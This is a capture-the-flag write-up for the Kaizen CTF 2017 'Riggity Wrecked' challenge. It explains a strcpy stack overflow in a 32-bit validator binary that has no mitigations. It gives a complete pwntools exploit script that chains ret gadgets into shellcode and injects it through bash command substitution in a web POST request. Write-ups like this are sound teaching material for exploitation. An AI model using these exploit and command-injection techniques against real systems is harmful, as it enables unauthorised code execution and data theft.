# Writeup for Riggity Wrecked (coin, 700 pts, 2 solves), Kaizen CTF at Blackhat 2017

Description:

> "Command Injection? ... I'm just reading them in the order that I'm seeing them."
> Woah! I wonder if we can go deeper. Can we exploit the validator binary itself?
> Submit the contents of the file at /home/anatomypark/flag.txt.

## TL;DR

- `strcpy(local_var, argv[2])`
- submit shellcode in `argv[1]`
- execute ROP chain to pop from stack until we hit a pointer to the shellcode
- return into shellcode

## Previous Knowledge

From the previous Coin challenges, we know that

- the `validator` binary is used to validate some user input

- the web page runs the binary with a POST request to `https://anatomypark.kaizen-ctf.com/api/v1/validateInviteCode`, supplying the parameters `name` and `invite`

- `validateInviteCode` effectively calls `system("validator <name> <invite>")`

## Analysing the Target

We perform some quick checks, before reversing the binary:

```
> file validator
validator: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=689ac5e07fd26cbf2fa963e632b71d07a294a0fd, stripped
```
32-bit binary, dynamically linked, stripped

```
> pwn checksec validator
[*] 'validator'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
All exploit mitigation techniques are turned off: no RELRO, no stack canary, NX and PIE are disabled.

After these checks, we load the binary in IDA and quickly spot the vulnerability:
```c
void __cdecl sub_8048589(int argc, char **argv)
{
  char *s; // [sp+18h] [bp-70h]@3
  char *v6; // [sp+1Ch] [bp-6Ch]@3
  char v7[64]; // [sp+20h] [bp-68h]@3
  signed __int32 v13; // [sp+74h] [bp-14h]@3

  if ( argc == 3 )
  {
    s = argv[1];
    strcpy(v7, argv[2]);
    v6 = sub_804850B(v7);
    v13 = strlen(s);
    if ( v13 <= 7 || v13 > 32 || v13 & 3 )
    {
      puts("failure");
    }
    else
    {
      [ ... ]
    }
  }
  else
  {
    puts("failure");
  }
}
```
We get an unbounded `strcpy` in a local variable, and if the first argument (the name) is longer than 32 characters, the function quickly returns, giving us the opportunity to take control of EIP or launch a ROP chain.

## The Exploit

Since NX is disabled, we can supply shellcode via the first command line parameter (which is stored somewhere way up on the stack).

One method to jump to our shellcode would be to prepend a nop sled and overwrite the saved return address with a hardcoded address hopefully pointing into our nop sled. Due to ASLR and varying environment variables, the stack shifts between executions, and hitting our shellcode would require several tries.

However, there is a better method. The stack does not only store the command line parameters, but also pointers to them (in `*argv`); it turns out that these pointers have a fixed offset from the saved return address we can overwrite. Subsequently, we can build a ROP chain consisting of ret-gadgets and pop our way up the stack, until we arrive at the desired pointer to our shellcode, and from there return into the shellcode. Since `strcpy` appends a null byte to whatever it copied, we also have to replace the last two ret-gadgets with a pop-ret-gadget.

Another issue we have to consider is escaping non-ascii characters in our payload (remember the binary is run like `system("validator <name> <invite>")`). I used command substitution to wrap the shellcode in an `echo -ne` call.

Putting everything together, we end up with the following exploit script:
```python
from pwn import *
import requests

LOCAL_BINARY = './validator'

context.binary = LOCAL_BINARY

ADDR_RET = 0x08048588
ADDR_POP_RET = 0x0804837d

def payload(a=None, b=None):
    if args['REMOTE']:
        def enc(x):
            return "`bash -c 'echo -ne \"" + ''.join("\\x" + hex(ord(c))[2:] for c in x) + "\"'`"
        a = enc(a)
        b = enc(b)
        r = requests.post('https://anatomypark.kaizen-ctf.com/api/v1/validateInviteCode', data={'name' : a, 'invite' : b})
        print r.text
    elif args['GDB']:
        proc = gdb.debug([LOCAL_BINARY, a, b])
        print proc.recvall()
        proc.close()
    else:
        proc = process([LOCAL_BINARY, a, b])
        print proc.recvall()
        proc.close()

def exploit():
    sc = asm(shellcraft.cat('/home/anatomypark/flag.txt') + shellcraft.exit(0))
    a = sc
    b = 'A' * 108 + p32(ADDR_RET) * 0x31 + p32(ADDR_POP_RET)
    payload(a, b)

if __name__ == '__main__':
    exploit()
```
Flag: `KAIZEN{it_g0es_w1thout_saying_th4t_the_rickest_r1ck_would_have_th3_mortiest_m0rty}`
